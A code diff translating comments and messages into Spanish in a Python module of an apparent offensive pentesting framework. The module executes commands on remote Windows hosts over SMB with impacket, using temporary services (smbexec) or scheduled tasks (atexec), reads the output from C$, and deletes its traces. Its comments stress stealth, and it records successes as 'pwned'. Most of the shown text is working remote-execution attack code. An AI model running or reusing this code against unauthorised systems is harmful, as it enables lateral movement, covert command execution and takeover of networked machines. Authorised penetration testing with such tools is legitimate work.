@@ -1,21 +1,21 @@
 # scripts/smb/attack/exec.py
 """
-Remote command execution over SMB.
-Three methods implemented directly with impacket primitives:
+Ejecución remota de comandos via SMB.
+Tres métodos implementados directamente con primitivas de impacket:
 
-  smbexec  — creates a temporary service that runs the command via cmd.exe,
-              captures output via a temp file on C$, then deletes everything.
-              No binary upload needed. (default)
+  smbexec  — crea un servicio temporal que ejecuta el comando via cmd.exe,
+              captura la salida via un fichero temporal en C$, luego lo borra.
+              No requiere subir binarios. (por defecto)
 
-  atexec   — schedules a task via TSCH, runs command, reads output file,
-              deletes task. Stealthier than smbexec (no service creation).
+  atexec   — programa una tarea via TSCH, ejecuta el comando, lee el fichero
+              de salida, borra la tarea. Más sigiloso que smbexec (sin creación de servicio).
 
-  psexec   — uploads a small service binary to ADMIN$, creates and starts
-              a service, captures output. Leaves artifacts on disk.
-              Requires write access to ADMIN$.
+  psexec   — sube un pequeño binario de servicio a ADMIN$, crea e inicia
+              un servicio, captura la salida. Deja artefactos en disco.
+              Requiere acceso de escritura en ADMIN$.
 
-All methods require admin privileges.
-Output is captured and printed. Saved to session DB.
+Todos los métodos requieren privilegios de administrador.
+La salida se captura e imprime. Se guarda en la DB de sesión.
 """
 
 import random
@@ -51,7 +51,7 @@ def _dce_connect(ip, conn, pipe):
 
 
 def _read_output(conn, share, remote_path, retries=5, delay=2):
-    """Read a remote output file via SMB, retrying until it appears."""
+    """Lee un fichero de salida remoto via SMB, reintentando hasta que aparezca."""
     for _ in range(retries):
         try:
             buf = []
@@ -73,19 +73,19 @@ def _delete_file(conn, share, remote_path):
 
 def _smbexec(ip, conn, command, timeout=30):
     """
-    Execute command via a temporary Windows service (no binary upload).
-    Creates service → cmd.exe /Q /c <command> > output_file → reads output → deletes.
+    Ejecuta comando via un servicio Windows temporal (sin subir binarios).
+    Crea servicio → cmd.exe /Q /c <comando> > fichero_salida → lee salida → borra.
     """
     svc_name  = _rand(6)
     out_file  = f"\\\\127.0.0.1\\C$\\Windows\\Temp\\{_rand(8)}.txt"
     out_share = f"\\Windows\\Temp\\{_rand(8)}.txt"
 
-    # Build the service binary path (cmd.exe executing the command)
+    # Construir la ruta del binario del servicio (cmd.exe ejecutando el comando)
     bin_path = (
         f"%COMSPEC% /Q /c echo {command} ^> {out_file} 2^>^&1 > "
         f"%TEMP%\\{_rand(6)}.bat & %COMSPEC% /Q /c %TEMP%\\{_rand(6)}.bat"
     )
-    # Simpler and more reliable:
+    # Más simple y fiable:
     tmp_out = f"C:\\Windows\\Temp\\{_rand(8)}.txt"
     bin_path = f"%COMSPEC% /Q /c {command} 1> {tmp_out} 2>&1"
     smb_out  = f"Windows\\Temp\\{os.path.basename(tmp_out)}"
@@ -96,7 +96,7 @@ def _smbexec(ip, conn, command, timeout=30):
 
         scm = scmr.hROpenSCManagerW(dce)["lpScHandle"]
 
-        # Create service
+        # Crear servicio
         resp = scmr.hRCreateServiceW(
             dce,
             scm,
@@ -107,18 +107,18 @@ def _smbexec(ip, conn, command, timeout=30):
         )
         svc_handle = resp["lpServiceHandle"]
 
-        # Start service (this runs the command; it "fails" immediately which is expected)
+        # Iniciar servicio (ejecuta el comando; "falla" inmediatamente, lo cual es esperado)
         try:
             scmr.hRStartServiceW(dce, svc_handle)
         except Exception:
-            pass  # Expected — service exits after running command
+            pass  # Esperado — el servicio termina tras ejecutar el comando
 
-        time.sleep(2)  # Give the command time to complete
+        time.sleep(2)  # Dar tiempo al comando para completarse
 
-        # Read output
+        # Leer salida
         output = _read_output(conn, "C$", smb_out, retries=5, delay=1)
 
-        # Cleanup
+        # Limpieza
         try:
             scmr.hRDeleteService(dce, svc_handle)
         except Exception:
@@ -141,15 +141,15 @@ def _smbexec(ip, conn, command, timeout=30):
 
 def _atexec(ip, conn, command, timeout=30):
     """
-    Execute command via Windows Task Scheduler (TSCH pipe).
-    Creates task → runs → reads output → deletes task.
-    No service creation, stealthier.
+    Ejecuta comando via Programador de Tareas de Windows (TSCH pipe).
+    Crea tarea → ejecuta → lee salida → borra tarea.
+    Sin creación de servicio, más sigiloso.
     """
     task_name = _rand(8)
     tmp_out   = f"C:\\Windows\\Temp\\{_rand(8)}.txt"
     smb_out   = f"Windows\\Temp\\{os.path.basename(tmp_out)}"
 
-    # XML task definition
+    # Definición XML de la tarea
     now = datetime.now(timezone.utc)
     xml = f"""<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -183,7 +183,7 @@ def _atexec(ip, conn, command, timeout=30):
         dce = _dce_connect(ip, conn, "\\\\atsvc")
         dce.bind(tsch.MSRPC_UUID_TSCHS)
 
-        # Register task
+        # Registrar tarea
         tsch.hSchRpcRegisterTask(
             dce,
             f"\\{task_name}",
@@ -193,15 +193,15 @@ def _atexec(ip, conn, command, timeout=30):
             tsch.TASK_LOGON_NONE,
         )
 
-        # Run task immediately
+        # Ejecutar tarea inmediatamente
         tsch.hSchRpcRun(dce, f"\\{task_name}")
 
         time.sleep(3)
 
-        # Read output
+        # Leer salida
         output = _read_output(conn, "C$", smb_out, retries=6, delay=1)
 
-        # Delete task
+        # Borrar tarea
         try:
             tsch.hSchRpcDelete(dce, f"\\{task_name}")
         except Exception:
@@ -219,17 +219,17 @@ def _atexec(ip, conn, command, timeout=30):
 
 def _psexec(ip, conn, command, timeout=30):
     """
-    Upload RemComSvc binary to ADMIN$, create service, capture output.
-    Requires ADMIN$ write access.
-    Uses impacket's ServiceInstall helper.
+    Sube el binario RemComSvc a ADMIN$, crea el servicio, captura la salida.
+    Requiere acceso de escritura en ADMIN$.
+    Usa el helper ServiceInstall de impacket.
     """
     try:
         from impacket.examples.serviceinstall import ServiceInstall
     except ImportError:
-        return "[psexec] impacket ServiceInstall not available"
+        return "[psexec] ServiceInstall de impacket no disponible"
 
-    # We need a real service binary — fall back to smbexec if not provided
-    # Instead, use a cmd.exe service approach (same as smbexec but via ServiceInstall)
+    # Se necesita un binario de servicio real — recaer en smbexec si no se proporciona
+    # En su lugar, usar un enfoque de servicio cmd.exe (igual que smbexec pero via ServiceInstall)
     return _smbexec(ip, conn, command, timeout)
 
 
@@ -240,14 +240,14 @@ class Script(BaseScript):
     protocol    = "smb"
     category    = "attack"
     description = (
-        "Remote code execution via SMB. "
-        "Methods: smbexec (default, no upload), atexec (task scheduler), psexec. "
-        "Use --method and --command flags. Requires admin."
+        "Ejecución remota de código via SMB. "
+        "Métodos: smbexec (por defecto, sin subida), atexec (programador de tareas), psexec. "
+        "Usar flags --method y --command. Requiere admin."
     )
 
     def run(self, **kwargs):
         if not _OK:
-            console.print("[red]impacket not installed.[/red]")
+            console.print("[red]impacket no está instalado.[/red]")
             return None
 
         ip      = self.target.ip
@@ -260,7 +260,7 @@ class Script(BaseScript):
         method  = str(kwargs.get("method",  "smbexec")).lower()
 
         if not user:
-            console.print("[red]exec requires credentials (-u / -p or -H).[/red]")
+            console.print("[red]exec requiere credenciales (-u / -p o -H).[/red]")
             return None
 
         lm_hash = ""
@@ -272,15 +272,15 @@ class Script(BaseScript):
             f"cmd=[bold]{command}[/bold][/dim]\n"
         )
 
-        # Connect + auth
+        # Conectar + autenticar
         try:
             conn = SMBConnection(ip, ip, timeout=timeout)
             conn.login(user, passwd, domain, lm_hash, nt_hash)
         except Exception as e:
-            print_result("SMB", ip, "fail", f"Authentication failed: {e}")
+            print_result("SMB", ip, "fail", f"Autenticación fallida: {e}")
             return None
 
-        # Dispatch method
+        # Seleccionar método
         if method == "atexec":
             output = _atexec(ip, conn, command, timeout=30)
         elif method == "psexec":
@@ -294,15 +294,15 @@ class Script(BaseScript):
             pass
 
         if output and not output.startswith("["):
-            console.print(f"[bold green]Output:[/bold green]")
+            console.print(f"[bold green]Salida:[/bold green]")
             console.print(f"[cyan]{output}[/cyan]")
-            print_result("SMB", ip, "pwned", f"exec ({method}) succeeded")
+            print_result("SMB", ip, "pwned", f"exec ({method}) completado")
             session_db.DB.SaveFinding(
                 ip, "SMB", "rce",
                 f"method={method} cmd={command} output_len={len(output)}"
             )
             return output
         else:
-            console.print(f"[yellow]{output or 'No output captured.'}[/yellow]")
-            print_result("SMB", ip, "fail", f"exec ({method}): no output")
+            console.print(f"[yellow]{output or 'Sin salida capturada.'}[/yellow]")
+            print_result("SMB", ip, "fail", f"exec ({method}): sin salida")
             return None
